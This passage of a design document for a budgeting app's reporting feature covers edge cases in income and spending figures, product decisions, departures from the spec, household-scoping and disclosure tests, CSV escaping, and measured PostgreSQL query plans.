- **A transfer**: both legs excluded from every figure, including uncategorised. A cross-currency
  transfer touches two currency reports and appears in neither.
- **A transfer that arrived by import**: each statement brings its own leg as an ordinary row.
  Slice 12's pairing action, "these two rows are one transfer", turns the two rows into a transfer
  ([file-import.md](file-import.md), rule 12), and from then on both are excluded like any other.
- **A credit-card payment.** A payment from checking to a card the household tracks *as an
  account* is a transfer and is excluded. The purchases made on the card are the spending. A
  household that records card purchases in a card account **and** records the payment as an
  expense from checking counts the same money twice. That is how the ledger was recorded, and the
  report reflects it faithfully. The user guide says to record a card payment as a transfer.
- **A refund larger than the month's spending in its category**: that category's spending is
  negative, shown negative, and left out of the proportion bar.
- **A salary correction**: negative in an income category, netted into income.
- **An uncategorised salary**: in `uncategorisedIn`, outside `income`, inside `kept`. The page
  points at the queue.
- **A `PENDING` transaction**: counted in its month, as the balance counts it.
- **A future-dated transaction**: counted in its month. A range that reaches into the future shows
  those months with whatever they hold, marked `complete: false`.
- **An archived account**: its transactions still count. Archiving hides a container. It does not
  rewrite history.
- **An archived category**: reported, flagged `archived`.
- **A category moved to another parent**: its whole history moves with it (today's tree).
- **A deleted category**: its transactions become uncategorised in every month, past ones included.
- **A month with nothing**: present in the series as zeros.
- **No complete month in range** (a brand-new household, or a range of only the current month):
  `averageKept` and `bestMonth` are `null`, and the insight sentence is not shown. It is never
  shown as £0.
- **Two months tie for best**: the earlier one is chosen.
- **The comparison period has no spending** for a category: `change` is `null` and the row says
  *"new"*.
- **A very large total**: `SUM` over `NUMERIC(19,4)` is exact and unbounded in PostgreSQL, and
  `BigDecimal` carries it. The client formats the string through `Intl`'s string overload without
  creating a `number`. Nothing overflows. A total wider than the column is still a correct total.
- **Several currencies**: one report each. No combined figure. The base currency is always present.
- **A household with no transactions at all**: the empty state, not a zero chart.

## Out of scope

- **Net worth across accounts** (decision 2). Four things block it today:
  1. `openingBalance` has no as-of date, so a balance "at the end of March" before the account's
     first transaction is a guess.
  2. `INVESTMENT` accounts carry no market value (`accounts.md`, open question 2).
  3. Debts are separate from accounts, and a `CREDIT_CARD` debt linked to a `CREDIT_CARD` account
     has **two** balances that are deliberately not reconciled (`debt-plan.md`).
  4. The shared chart clamps negatives, and a household's net worth can be below zero.
- **Envelope and bill variance over time** (decision 3). The data exists, as entries against
  envelope amounts and occurrence actuals against expected amounts. The designs do not show it.
- **A converted household roll-up, and the `ExchangeRate` entity** (decision 9).
- **Statistical "patterns"**, and anything that proposes or makes a change (decision 7).
- **Reconciliation.** It is not part of slice 13 and has no slice yet (decision 12). It is a write
  feature over the ledger with no design. `transactions.md` is corrected to say so. A `--` comment
  in V12 still says "slice 13". V12 is merged and migrations are append-only, so it stays wrong.
- **`AUTO` income sources derived from history** (`bills-and-income.md` defers this to slice 13).
  Report 1's per-month income is the data it would use. Turning that into an `IncomeSource` is a
  write to the plan with its own rules about averaging windows, and it belongs in a bills change.
- **The desktop home page's Income vs spending card.** That page has no slice of its own. Whoever
  builds it reads `GET /api/reports/income-and-spending`.
- **Filters** (by account, by member, by payee) and **income by category.** Each is a parameter
  away once wanted. An id filter must resolve through the scoped query.
- **Payee reports** ("where it went, by payee"). They are wanted (`transactions.md` and
  `categories.md` both defer payee and category merging to "reporting shows why it matters"). But
  payee normalisation is not built, so today's report would split "STARBUCKS #1234" from
  "Starbucks" and mislead.
- **A whole-ledger export.** It is a backup and portability feature, not a report.
- **Caching or materialising any figure.** See
  [Computed on request](#computed-on-request-not-cached). Doing it needs an ADR.

## Decisions

Decided 2026-11-25 by the product owner. Each one took the doc's recommendation.

1. **Which reports ship first?** Two: income and spending by month (with kept, the average and the
   best month), and spending by category against the preceding range.
   *Reason:* they are exactly what the Insights artboard draws, and need no new table, rate or plan
   decision.
2. **Net worth: when, and what is it called?** Deferred. When built, it is "account balances over
   time", per currency, accounts only, with debts on their own line.
   *Reason:* the four blockers under [Out of scope](#out-of-scope). A net worth that omits debts or
   counts a card twice is worse than none.
3. **Envelope and bill variance across months?** A second cut, not the first.
   *Reason:* the designs do not draw it, and it needs a rule for when manual entries and ledger rows
   disagree.
4. **How are uncategorised transactions treated?** As their own visible term: in `kept`, in neither
   income nor spending, with a link to "Needs a category".
   *Reason:* folding them in by sign guesses, and leaving them out of `kept` breaks its match with
   the change in balances.
5. **Ledger only, or envelope entries too?** Ledger only, and the page says so.
   *Reason:* `MANUAL` entries, paid occurrences and debt payments are plan records, and counting
   them beside their transactions is the double count ADR-0025 names.
6. **"Where {month} went": which month by default?** The last complete month, with previous and
   next controls.
   *Reason:* a half-finished month against a whole one makes every category look like it fell.
7. **How far do insights go?** Only "kept on average, best month" and the per-category change.
   "Pattern worth knowing" is deferred, and anything that proposes a change belongs to the check-in
   (14) or the assistant (17).
   *Reason:* four data points are noise, and a proposal that writes is not a report.
8. **CSV export in the first cut?** Yes, for both reports, as a second representation of the same
   resources, with the escaping specified under [CSV export](#csv-export).
   *Reason:* self-hosters expect to get their figures out, and it is exactly the table's rows.
9. **Converted roll-ups and `ExchangeRate`: this slice or the next?** A follow-on slice of their
   own. The first cut reports per currency only.
   *Reason:* rates bring an entity, a manual-rate screen and a "rate missing" state, and the
   per-currency cut is complete without them. This departs from ADR-0022's follow-up note, which
   places them "with the reporting slice".
10. **Should a household have a time zone?** Not in this slice. The UTC application clock sets the
    "complete month" flag, and the client builds ranges from the device's date.
    *Reason:* transaction dates are calendar dates, so only the in-progress marker can be off, and a
    household zone is a house-wide decision.
11. **Is 24 months the right cap on one request?** Yes. The UI offers 12, 6 and 3.
    *Reason:* it bounds every response without pagination and fits a year beside the year before.
12. **Is reconciliation part of slice 13?** No. It has no slice yet, and gets a roadmap row when it
    has a design. `transactions.md`'s two references are corrected now.
    *Reason:* it writes to the ledger and has no artboard, and nothing in reporting depends on it.

## What slice 13 has built

Everything above, with the departures below. Each one is either additive to the API or a
narrowing of the text, and each has a reason; none was taken silently.

**Backend** (`com.budgetowl.report`): `ReportRepository` holds the two grouped JPQL queries, one
per report, with no native SQL. `ReportService` assembles them per currency with `Money`, and
`ReportController` serves `GET /api/reports/income-and-spending` and
`GET /api/reports/spending-by-category` as JSON, or as CSV for `Accept: text/csv`. There is no
migration (`V20` stayed unused) and no new index. The CSV writer is shared, in
`com.budgetowl.common.csv.CsvWriter`, for slice 12 to reuse. ADR-0039 amends ADR-0022's follow-up
note (decision 9).

**Frontend**: `/insights`, a nav item **Insights** between Categories and Household, and the two
cards described under [UI](#ui). The shared `LineChartComponent` gained an optional `tone` for two
peer lines; `role` still decides weight and dash.

**Fixtures and guide**: `DemoFixtureIT` generates `tools/ui/fixtures/report-api.generated.ts` (the
demo household) and `report-states.generated.ts` (an empty household and a two-currency one) from
the real application. The guide is `userguide/features/see-where-your-money-went.md`.

### Departures from the text above

| Where | The text says | What was built | Why |
| ----- | ------------- | -------------- | --- |
| Report 1, per currency | The fields in the example | **Added `transactionCount`** (non-transfer rows in the range) | The empty state needs "nothing recorded", and figures that net to zero are not that fact. Without it the client would have to guess |
| Report 1, per currency | — | **Added `totals`** (`income`, `spending`, `uncategorisedIn`, `uncategorisedOut`, `kept` over the whole range, the month in progress included) | The "isn't counted as income or spending" sentence needs the range's uncategorised total, and the client does no money arithmetic, not even a sum of months |
| Report 1, `uncategorisedCount` | Not defined beyond the example | **Every uncategorised non-transfer row in the range, in either direction** | The sentence names the inflow and the outflow separately when both exist |
| Report 2 | No `complete` flag | **Added `complete`**, false when the range reaches the current month by the server's clock | The heading says "has gone so far" for the month in progress, and decision 10 puts that judgement on the server's clock |
| Report 2, uncategorised `count` | "with its count" | **The count of uncategorised *outflow* rows in the range** | It sits beside the outflow figure and must describe the same rows |
| Report 2, `share` denominator | "the currency's positive spending total" | **The sum of the positive top-level rows' spending** | So the positive rows' shares fill the bar. A child's share uses the same denominator |
| Report 2, which categories appear | "non-zero spending in either range" | As stated, **and a parent with any shown child is shown** even if its own total nets to zero | Otherwise a child that moved would be unreachable |
| Report 2, the scan | One grouped query | One grouped query **that also returns income-category groups**, which the service ignores | An income-only currency must still appear (Currencies, above). Filtering kinds in SQL would hide it |
| Range validation | `from > to` is `report-range-invalid` | Also **a range, or report 2's comparison range, that reaches before year 1** is `422 report-range-invalid` | `0000-01` passes the four-digit pattern. Java has a year 0 and PostgreSQL does not, so it is refused rather than sent to the driver |
| Missing `from`/`to` | `400 validation-failed` naming the field | As stated, by declaring both `@RequestParam(required = false) @NotNull` | A missing required parameter reaches the shared handler as a generic `request-rejected`. Optional-plus-`@NotNull` routes it through native method validation instead. The shared handler is unchanged |
| The chart's peer lines | "renames the roles … or adds a peer pair" | **An optional `tone` on a series** that changes only the colour | Additive, so the debt plan and slice 11 are untouched. Weight and dash still come from `role`, and the greyscale capture confirms the lines are told apart |
| The chart's stroke colours, light mode | `--color-accent-2-500` and `--color-accent` | **`--color-accent-2-600` and `--color-accent-600`**. Dark mode is the 400 tints, as specified | Measured against the card surface (`--color-surface`): 500 is about 2.1:1 and the accent about 2.7:1, under WCAG 1.4.11's 3:1 for graphics. The 600 steps are about 3.1:1 and 3.4:1 |
| The envelope-only sentence | Shown when only envelope entries exist | **Shown in every empty state** | Telling "only envelope entries" apart needs a second feature's endpoint. The sentence is true in every empty state and is the likeliest explanation for one |
| "Needs a category" link | Links to `/transactions` with the uncategorised filter | **`/transactions?filter=uncategorised`, and the ledger now reads that parameter** to open pressed | The ledger had no way to be opened pre-filtered. Additive, with its own spec |
| CSV writer location | "One CSV writer in the reporting web layer" | **`com.budgetowl.common.csv.CsvWriter`**, with `ReportCsv` in the reporting web layer choosing which columns are text | Slice 12 reuses the writer (`file-import.md`). The escaping list and the column-type rule live once, in common |
| Report 2 CSV columns | Not specified | `currency, from, to, comparedFrom, comparedTo, row, category, parent, archived, spending, comparedSpending, change, share, direct, count`. `row` is a code: `CATEGORY`, `SUBCATEGORY` or `UNCATEGORISED` | Codes, not prose (ADR-0023). Only `category` and `parent` are text |
| Disclosure test levels | `INFO` and `DEBUG` | `INFO`, `DEBUG`, **and the web layer at `TRACE`**. `DEBUG` also lowers `com.budgetowl`, which `application.yml` pins to `INFO` | At `DEBUG`, Spring MVC truncates a logged body to 100 characters, so a report's figures never reach that line and a missing redaction cannot fail the test. At `TRACE` the whole body is printed. See `docs/memory/gotchas.md` |
| Demo fixtures | "about 12 months of categorised transactions … adding" to `demo-data.ts` | The history lives in the **generated** ledger (`REPORT_LEDGER`), which `demo-data.ts` imports and checks `DEMO_TRANSACTIONS` against at load | The history is generated from the same table the backend seeds, so a hand edit cannot drift. The ledger mock still serves August only, and `DEMO_ACCOUNTS`' balances are not recomputed from the history |

### How the scoping test proves each predicate

**With the database's guards in place, no single predicate's removal is observable.** The
composite foreign keys tie a transaction to an account and a category of its own household, and
`trg_categories_two_levels` ties a child category to a parent of its own household. So every row
joins only rows of its own household, and removing any *one* table's predicate changes no figure:
the others still exclude the same rows. A realistic second household catches only the loss of
every predicate on the query's path.

`ReportHouseholdScopingIT` does both:

1. `aSecondHouseholdWithTheSameNamesMonthsAndCurrencyChangesNoFigure` is the realistic test the
   text asks for.
2. `eachTablesOwnPredicateKeepsOutTheRowThatOnlyItCanStop` drops the two composite foreign keys
   and disables the parent trigger, noisily, and restores all three afterwards, as
   `AccountHouseholdScopingIT` does for the singleton index. It then seeds one row per predicate
   that **only that predicate** can keep out: another household's transaction on this household's
   account and category; this household's transaction on another household's account; one filed
   under another household's category; and one under a category nested in another household's
   parent (in the comparison month).

**Sabotage, run 2026-11-25.** Each predicate was removed in turn from the committed query and the
test run:

| Removed | Result |
| ------- | ------ |
| Report 1, `t.householdId` | fails: the predicate test |
| Report 1, `a.householdId` | fails: the predicate test |
| Report 1, `c.householdId` | fails: the predicate test |
| Report 1, every household predicate | fails: both the realistic test and the predicate test |
| Report 2, `t.householdId` | fails: the predicate test |
| Report 2, `a.householdId` | fails: the predicate test |
| Report 2, `c.householdId` | fails: the predicate test |
| Report 2, the parent's `p.householdId` | fails: the predicate test, and the other household's parent name appears in the tree |

Other controls were sabotaged the same way and each failed its test. The transfer predicate fails
the three transfer tests, by name, on the uncategorised fields. `HALF_DOWN` in place of `HALF_EVEN`
fails the rounding tests. A tie going to the later month, the current month marked complete,
negative spending clamped, and a query per month (N+1) each fail their test. In the formula
escaper, dropping a full-width trigger or skipping typed-column validation fails `CsvWriterTest`.
An HTTP client field, a `save` on the report repository, and a service method that is not
read-only each fail `ReportingArchitectureTest`. A figure logged by our own code, and the response
records printing every component, fail `ReportDisclosureIT`.

### Query plans, measured

PostgreSQL 16.16 (the Testcontainers image), one household, 4 accounts (one EUR), 30 categories
(6 parents with 4 children each), and **50,000 transactions over ten years**: 49,000 ordinary rows
(about 6% uncategorised, about 11% positive) plus 500 transfers (1,000 legs). `ANALYZE` was run
first. The SQL is what Hibernate generated from the JPQL, run as `EXPLAIN (ANALYZE, BUFFERS)`.

**Report 1, 24 months** (2024-09 to 2026-08), 9,793 rows in range:

```
HashAggregate  (actual time=9.957..10.021 rows=48)
  Group Key: EXTRACT(year FROM date), EXTRACT(month FROM date), a.currency
  ->  Hash Left Join  (rows=9793)   Filter: (t.category_id IS NULL OR c.household_id = $h)
        ->  Hash Join  (t.account_id = a.id)
              ->  Bitmap Heap Scan on transactions t  (rows=9793)
                    Recheck Cond: household_id = $h AND date >= '2024-09-01' AND date < '2026-09-01'
                    Filter: transfer_group_id IS NULL   Rows Removed by Filter: 202
                    ->  Bitmap Index Scan on ix_transactions_household_date  (rows=9995)
              ->  Seq Scan on accounts a   Filter: household_id = $h   (4 rows)
        ->  Seq Scan on categories c   (30 rows)
Planning Time: 0.369 ms   Execution Time: 10.210 ms   Buffers: shared hit=1024
```

**Report 2, 24 months against the 24 before** (48 scanned, 2022-09 to 2026-08), 19,601 rows:

```
HashAggregate  (actual time=18.748..18.775 rows=47)
  Group Key: a.currency, c.id, p.id
  ->  Hash Left Join  (c.parent_id = p.id)   Filter: (c.parent_id IS NULL OR p.household_id = $h)
        ->  Hash Left Join  (t.category_id = c.id)   Filter: (t.category_id IS NULL OR c.household_id = $h)
              ->  Hash Join  (t.account_id = a.id)
                    ->  Seq Scan on transactions t  (rows=19601)
                          Filter: transfer_group_id IS NULL AND date >= '2022-09-01'
                                  AND date < '2026-09-01' AND household_id = $h
                          Rows Removed by Filter: 30399
Planning Time: 0.487 ms   Execution Time: 18.944 ms   Buffers: shared hit=913
```

**Report 2, one month against one** (2026-08 against 2026-07), 831 rows: a bitmap index scan on
`ix_transactions_household_date`, then the same hash joins. **Execution 1.6 ms.**

The 48-month scan reads 39% of the table, and the planner rightly prefers a sequential scan to an
index for that. Every other range uses `ix_transactions_household_date`. Grouping by the category
and parent ids lets PostgreSQL drop the functionally dependent name and archived columns from the
group key.

**End to end through `ReportService`** (warm, median of 21, p95 in brackets): report 1, 12 months
9.1 ms (9.6); report 1, 24 months 14.4 ms (16.2); report 2, one month 6.0 ms (7.7); report 2,
24 months against 24, 21.9 ms (23.5). Those times include the membership lookup.

**No index is added.** Nothing in these plans is slow enough to justify the write cost of a
covering index (`database-style.md`). The figures come from a probe test that was run once and
not committed. Re-measure if a household ever approaches ten times this volume.

## Testing notes

Beyond `../guides/testing-style.md`'s mandatory list: `401` unauthenticated, `400` naming the
field, the happy path, and identical behaviour under session and bearer. There is no write route,
so the mandatory `VIEWER`-`403` and CSRF tests do not apply. In their place:

- **`ReportAccessIT`**: a `VIEWER` gets `200` with figures identical to an `OWNER`'s. A user with
  no membership gets `403 not-a-member`. `POST`, `PUT`, `PATCH` and `DELETE` on each report path
  are refused (`405`), so a write cannot appear here unreviewed.
- **`ReportHouseholdScopingIT`**: the test that proves control 1. Seed a **second** household with
  transactions in the same months, categories with the same names and accounts in the same
  currency, using `AccountHouseholdScopingIT`'s drop-and-restore of `uq_households_singleton`.
  Assert both reports' figures are unchanged to the last digit. Then remove the `household_id`
  predicate from each table in turn and confirm the test fails each time. A cross-household `404`
  test cannot prove this, because there is no id to send.
- **`IncomeAndSpendingIT`**, covering the arithmetic the page leads with:
  - a same-currency **transfer** changes no figure, including `uncategorisedIn` and
    `uncategorisedOut`. This is the trap, so it is asserted on the uncategorised fields by name;
  - a cross-currency transfer changes neither currency's report;
  - a **refund** reduces spending in its category and does not appear in income;
  - a refund larger than the month's spending gives **negative** spending, not zero;
  - a negative amount in an income category reduces income;
  - an uncategorised inflow lands in `uncategorisedIn`, in neither income nor spending, and **in**
    `kept`;
  - `kept = income − spending + uncategorisedIn − uncategorisedOut` exactly, and `kept` equals the
    plain sum of all non-transfer amounts, over a generated month of mixed rows;
  - `PENDING` rows count; an opening balance does not;
  - envelope `MANUAL` entries, paid bill occurrences and debt payments change nothing (decision 5);
  - two ordinary rows paired into a transfer (slice 12) leave every figure. Split again, they
    count as uncategorised rows;
  - a transaction on the 1st and one on the last day of a month fall in that month. A 31st and the
    following 1st fall in different months. February in a leap year is handled;
  - months with no rows are present as zeros;
  - with a fixed `Clock`, the current month is `complete: false`. `averageKept` and `bestMonth`
    ignore it. A tie for best month picks the earlier one. With no complete month both are `null`;
  - amounts keep every digit across the wire, and none is a JSON number.
- **`SpendingByCategoryIT`**: children plus `direct` equal the parent exactly. The comparison range
  is the preceding range of equal length, for one month and for three. `change` is `null` against
  zero, and `HALF_EVEN` at scale 4 otherwise. An archived category is reported. After a category
  delete, its history is uncategorised. After a category move, its history follows it. Ordering is
  deterministic on ties. `share` is `null` for non-positive rows.
- **`ReportCurrencyIT`**: two currencies give two complete reports and no combined figure. Base
  currency comes first and is present even with no rows. `Money` arithmetic across currencies
  throws inside the service (testing-style item 9).
- **`ReportRangeIT`**: `from > to` gives `422 report-range-invalid`. Twenty-five months gives `422
  report-range-too-long` with the limit in `params`. Twenty-four months is accepted.
  `+10000-01`, `2026-13`, `26-08` and an empty value each give `400` naming the field and never a
  `500`.
- **`ReportDisclosureIT`**: both endpoints, both representations, at `INFO` and at `DEBUG`. No
  amount and no category name appear in captured log output. This follows `AccountDisclosureIT`'s
  shape, and it also closes the "no disclosure test for amounts" gap that `transactions.md` records
  for the ledger, for this path.
- **`CsvWriterTest`**: every OWASP leading character in a text cell is escaped. A
  category named `-5` is escaped, and a `-5.0000` amount is not. Quotes are doubled, and newlines
  inside a name stay inside one quoted field. The BOM is present. A typed column whose value does
  not match its pattern fails loudly rather than being written. Plus an IT asserting
  `Content-Type`, `Content-Disposition` built only from periods, and `Cache-Control: no-store`.
- **`ReportingArchitectureTest`** (ArchUnit): the reporting package depends on no HTTP client and
  on no repository method that writes.
- **Query cost**: a query-count assertion of one statement per report scan, so an N+1 per category
  or per month fails. During implementation, run `EXPLAIN ANALYZE` against a household seeded with
  50,000 transactions over ten years and **record the plan and timing in this doc**. The
  "milliseconds" claim under [Computed on request](#computed-on-request-not-cached) is an estimate
  until that is done.
- **Frontend**: `reports-data.spec.ts` checks that amounts stay strings, that `change` is formatted
  and never computed, and that ranges are built from the device date. `insights.page.spec.ts`
  checks both cards; the table alternative with the same figures as the chart's `said` sentences;
  "flat", "new", "up" and "down" in words; negative spending rendered negative; the empty state;
  the envelope-only sentence; the currency switcher; and a `VIEWER` seeing everything.
- **`tools/ui-check.sh`**: `/insights` at both viewports, light and dark, with axe, **read as
  screenshots**. The two lines must be distinguishable in a greyscale reading of the screenshot,
  not only in the stylesheet.

## Where the designs and this doc disagree

Recorded so the gap is visible rather than smoothed over.

- **The two chart lines differ by colour alone in the canvas.** This doc adds the shared
  component's weight and dash (WCAG 1.4.1).
- **The desktop card has a y-axis ($6k / $4k / $2k / $0), gridlines and five month labels.** The
  shared component draws a baseline and two end labels, by design (*"the ends are what a person
  reads off a line"*). The first cut reuses the component as it is. A y-axis is a design-system
  question, not something to add on one page.
- **The canvas's top-level categories (Housing, Dining) are not the default set.** In
  `DefaultCategories.ALL`, rent sits under **Bills** and dining is **Eating Out**. With top-level
  rows, a default household sees rent inside "Bills". The canvas list is illustrative. The page
  shows the household's own tree.
- **"Sep 25 → Aug 26"** reads as two dates. It is rendered as month and year through `Intl`.
- **There is no desktop Insights artboard and no dark mobile one.** Desktop is composed from the
  web home's card and the mobile screen's content. Dark mode comes from the tokens.
- **The canvas's figures are invented** (`design/README.md`). Fixtures come from
  `tools/ui/fixtures/demo-data.ts` and are computed, not copied. Do not expect $906 to be the mean
  of the plotted points.
